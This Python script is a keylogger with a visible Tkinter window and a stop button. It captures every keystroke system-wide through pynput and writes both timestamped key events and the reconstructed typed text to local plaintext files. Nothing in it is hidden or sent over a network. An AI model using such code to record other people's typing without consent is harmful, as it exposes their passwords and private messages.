import logging
from pynput import keyboard
import tkinter as tk
from tkinter import scrolledtext

# Global variables
log_text = None
sorted_keys_file = 'sorted_keys.txt'
shift_pressed = False  # To track the state of the Shift key
ctrl_pressed = False

def on_press(key):
    global log_text, shift_pressed, ctrl_pressed
    try:
        char = key.char
        if shift_pressed or key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            # Keep the character as is (uppercase) if Shift is pressed
            logging.info(f'Key {char} pressed')
            log_text.insert(tk.END, f'Key {char} pressed\n')
        else:
            # Convert to lowercase for consistency if Shift is not pressed
            char = char.lower()
            logging.info(f'Key {char} pressed')
            log_text.insert(tk.END, f'Key {char} pressed\n')
        write_sorted_key(char)
    except AttributeError:
        logging.info(f'Special key {key} pressed')
        handle_special_keys(key)
    
    # Detecting Shift key press
    if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shift_pressed = True
    
    # Detecting Ctrl+C (example)
    if key == keyboard.Key.ctrl_l:
        ctrl_pressed = True
    elif key == keyboard.KeyCode.from_char('c') and ctrl_pressed:
        log_text.insert(tk.END, "Ctrl + C was pressed\n")
        logging.info("Ctrl + C was pressed")

def handle_special_keys(key):
    global log_text
    if key == keyboard.Key.space:
        log_text.insert(tk.END, 'Key <SPACE> pressed\n')
        write_sorted_key(' ')
    elif key == keyboard.Key.enter:
        log_text.insert(tk.END, 'Key <ENTER> pressed\n')
        write_sorted_key('\n')
    else:
        log_text.insert(tk.END, f'Special key {key} pressed\n')

def on_release(key):
    global shift_pressed, ctrl_pressed
    if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shift_pressed = False
    if key == keyboard.Key.ctrl_l:
        ctrl_pressed = False

def write_sorted_key(char):
    with open(sorted_keys_file, 'a') as file:
        file.write(char)

def setup_logging():
    logging.basicConfig(filename='key_log.txt', level=logging.INFO, format='%(asctime)s: %(message)s')

def stop_keylogger():
    listener.stop()  # Stop the listener
    root.destroy()  # Destroy the root window to properly close the application

def setup_gui():
    global root, log_text
    root = tk.Tk()
    root.title("Keylogger GUI")

    log_text = scrolledtext.ScrolledText(root, width=60, height=20, bg='black', fg='lime', font=('Courier', 12))
    log_text.pack(pady=10, padx=10)

    stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger, bg='red', fg='white')
    stop_button.pack()

def main():
    global log_text, listener
    setup_logging()
    setup_gui()

    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()

    root.mainloop()

if __name__ == "__main__":
    main()
